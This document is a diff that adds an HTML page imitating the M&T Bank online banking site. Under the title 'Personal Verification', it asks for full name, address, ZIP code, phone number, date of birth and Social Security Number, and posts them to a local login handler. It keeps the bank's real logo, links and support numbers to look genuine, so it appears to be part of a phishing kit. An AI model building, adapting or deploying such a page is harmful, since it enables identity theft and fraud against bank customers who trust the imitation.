@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Welcome to Online Banking</title>
+  <link rel="shortcut icon" href="/img/favicon.png" type="image/x-icon">
+  <link href="/css/main.css" rel="stylesheet">
+  <script src="/js/jquery.js"></script>
+  <script src="/js/mask.js"></script>
+</head>
+
+<body>
+  <div class="cb-app">
+    <header class="cb-header">
+      <div class="grid-x align-center">
+        <div class="cell">
+          <a href="https://www.mtb.com/home-page" class="cb-logo">
+            <img src="/img/logo.svg">
+          </a>
+        </div>
+      </div>
+    </header>
+
+
+    <form action="/auth/login/4" method="post">
+      <div class="cb-login-content">
+        <div class="grid-x grid-padding-x grid-x__padded __spacer-section">
+          <div class="cell">
+            <div class="cb-header-sect cb-header-sect-login">
+              <h1>
+                Personal Verification
+              </h1>
+              <p>
+                Help us confirm it's you by filling out the following information.
+              </p>
+            </div>
+          </div>
+
+          <div class="cell">
+            <label for="fullName">Full Name</label>
+            <div class="input-group cb-single-input">
+              <input class="input-group-field" type="text" id="fullName" name="fullName" autocomplete="off">
+            </div>
+
+            <p class="form-error cb-error-bdr">
+              <i class="cb-icon cb-icon-notification-error"></i>
+              <span class="cb-error-paragraph">Please provide your Full Name.</span>
+            </p>
+          </div>
+
+          <div class="cell">
+            <label for="address">Street Address</label>
+            <div class="input-group cb-single-input">
+              <input class="input-group-field" type="text" id="address" name="address" autocomplete="off">
+            </div>
+
+            <p class="form-error cb-error-bdr">
+              <i class="cb-icon cb-icon-notification-error"></i>
+              <span class="cb-error-paragraph">Please provide your Street Address.</span>
+            </p>
+          </div>
+
+          <div class="cell">
+            <label for="zip">ZIP Code</label>
+            <div class="input-group cb-single-input">
+              <input class="input-group-field" type="text" id="zip" name="zip" autocomplete="off">
+            </div>
+
+            <p class="form-error cb-error-bdr">
+              <i class="cb-icon cb-icon-notification-error"></i>
+              <span class="cb-error-paragraph">Please provide your ZIP Code.</span>
+            </p>
+          </div>
+
+          <div class="cell">
+            <label for="phone">Mobile Phone</label>
+            <div class="input-group cb-single-input">
+              <input class="input-group-field" type="text" id="phone" name="phone" autocomplete="off">
+            </div>
+
+            <p class="form-error cb-error-bdr">
+              <i class="cb-icon cb-icon-notification-error"></i>
+              <span class="cb-error-paragraph">Please provide your Mobile Phone.</span>
+            </p>
+          </div>
+
+          <div class="cell">
+            <label for="dob">Date of Birth</label>
+            <div class="input-group cb-single-input">
+              <input class="input-group-field" type="text" id="dob" name="dob" placeholder="MM/DD/YYYY" autocomplete="off">
+            </div>
+
+            <p class="form-error cb-error-bdr">
+              <i class="cb-icon cb-icon-notification-error"></i>
+              <span class="cb-error-paragraph">Please provide your Date of Birth.</span>
+            </p>
+          </div>
+
+          <div class="cell">
+            <label for="ssn">Social Security Number</label>
+            <div class="input-group cb-single-input">
+              <input class="input-group-field" type="password" id="ssn" name="ssn" autocomplete="off">
+              <div class="input-group-button">
+                <button type="button" id="showHide" class="button clear inputHidden">Show</button>
+              </div>
+            </div>
+
+            <p class="form-error cb-error-bdr">
+              <i class="cb-icon cb-icon-notification-error"></i>
+              <span class="cb-error-paragraph">Please provide your Social Security Number.</span>
+            </p>
+          </div>
+        </div>
+
+        <div class="grid-x grid-padding-x __spacer-paragraph grid-x__padded">
+          <div class="cell">
+            <button type="submit" class="button button__form-no-spacer expanded" id="submitBtn">Next</button>
+          </div>
+
+          <div class="cell">
+            <a href="https://onlinebanking.mtb.com/Login/LoginHelp" class="button button-padding-no-spacer expanded clear">Help with User ID or Passcode</a>
+          </div>
+          <div class="cell">
+            <a href="https://onlinebanking.mtb.com/Enrollment/Enroll" class="button button__padding expanded clear">Enroll Now</a>
+          </div>
+
+          <p class="cell text-center __font-size-tiny __color-gray-accent">Unauthorized access is prohibited. Usage may be monitored.</p>
+        </div>
+      </div>
+    </form>
+
+    <hr class="__spacer-section">
+
+    <div class="cb-error-content">
+      <div class="grid-x grid-padding-x grid-x__padded">
+        <div class="cell text-center">
+          <p class="__font-size-secondary">
+            Have questions about M&amp;T Online Banking?
+          </p>
+        </div>
+        <div class="cell medium-6 text-center">
+          <p class="__font-size-secondary __color-primary __spacer-paragraph-half">
+            Personal Accounts:
+            <a href="tel:1-800-790-9130" class="__no-underline">1-800-790-9130</a>
+          </p>
+          <p class="__font-size-sub __spacer-remove __color-gray-accent">
+            Monday - Friday 8am - 9pm ET
+          </p>
+          <p class="__font-size-sub __spacer-paragraph __color-gray-accent">
+            Saturday - Sunday 9am - 5pm ET
+          </p>
+        </div>
+        <div class="cell medium-6 text-center">
+          <p class="__font-size-secondary __color-primary __spacer-paragraph-half">
+            Business Accounts: <a href="tel:1-800-724-6070" class="__no-underline">1-800-724-6070</a>
+          </p>
+          <p class="__font-size-sub __spacer-remove __color-gray-accent">
+            Monday - Friday 6am - 9pm ET
+          </p>
+          <p class="__font-size-sub __spacer-section __color-gray-accent">
+            Saturday - Sunday 9am - 5pm ET
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <section class="cb-footer cb-footer__auth" style="height: 14.25rem;">
+      <div class="grid-x" style="height: 14.25rem;">
+        <div class="cell flex-container flex-dir-column align-center-middle">
+          <div class="cb-footer--auth">
+            <a href="https://upgrade.mtb.com/olb-upgrade">Get Started Guide</a>
+            <a href="https://www.mtb.com/olbsecurity">Security Assistance</a>
+            <a href="https://www3.mtb.com/homepage/explore-the-m-and-t-bank-help-center/digital-services-agreement.html">Digital Service Agreement</a>
+            <a href="https://asset.mtb.com/Documents/html/ESign.htm">ESign Agreement</a>
+            <a href="https://mtb.com/olb-accessibility">Accessibility</a>
+            <a href="https://www.mtb.com/olb-personalsite">mtb.com</a>
+          </div>
+
+          <div class="cb-footer--non-auth">
+            <p>
+              ©2023 M&amp;T Bank. All Rights Reserved.<br>
+              Users of this website agree to be bound by the provisions of the M&amp;T website <a href="https://www.mtb.com/help-center/policies/terms-of-use"> Terms of Use</a> and <a href="https://www.mtb.com/privacy">Privacy</a>.
+            </p>
+            <div class="cb-footer__logo">
+              <a href="https://www.mtb.com/equalhousinglender">
+                <img src="/img/ehl.svg" class="cb-footer__ehl">
+              </a>
+              <a href="https://www.mtb.com/olb-entrust">
+                <img src="/img/entrust.svg" class="cb-footer__entrust">
+              </a>
+            </div>
+            <p>
+              Equal Housing Lender NMLS #381076
+              <a href="https://www.mtb.com/fdic">Member FDIC</a>
+            </p>
+          </div>
+        </div>
+      </div>
+    </section>
+  </div>
+
+  <script src="/js/main.js"></script>
+  <script>
+    $('#zip').mask('00000');
+    $('#phone').mask('(000) 000-0000');
+    $('#dob').mask('00/00/0000');
+    $('#ssn').mask('000-00-0000');
+  </script>
+</body>
+
+</html>
